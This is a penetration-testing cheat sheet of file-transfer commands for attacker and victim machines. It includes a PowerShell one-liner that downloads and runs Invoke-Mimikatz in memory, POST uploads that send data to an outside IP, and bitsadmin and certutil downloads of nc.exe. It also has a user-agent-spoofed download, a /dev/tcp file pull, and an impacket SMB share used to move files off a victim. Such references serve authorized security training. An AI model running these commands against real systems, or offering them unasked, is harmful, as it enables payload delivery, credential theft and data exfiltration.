| **Command** | **Description** |
| ---- | ---- |
| **Windows** |  |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `Invoke-WebRequest -Uri $uri -Method POST -InFile $filePath` | Upload file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
| **Linux** |  |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `nc -lvnp 8000 < file` | To start nc listener to send the file |
| `bash -c "cat < /dev/tcp/<sender_ip>/<sender_port> > file"` | Download file using nc |
| `python3 -m pip install --user uploadserver` | Install python upload server |

### Create an smb share using impacket smbserver

| **Command** | **Description** |
|-------------|-----------------|
| ***On attack machine*** |
| `#> python3 <path>/smbserver.py -smb2support <share_name> <receiver_path>` | Starts an smbv1 share. `-smb2support` is used to support newer SMB versions |
| ***On victim machine*** |
| `move <filename> \\<smb_server_ip>\<share_name>` | Use `move` to copy the files to the smb share |


Downloading Using SCP

`scp <user>@<ip>:<remote path> <local path>`


Uploading Using SCP

`scp <local path> <user>@<ip>:<remote path>`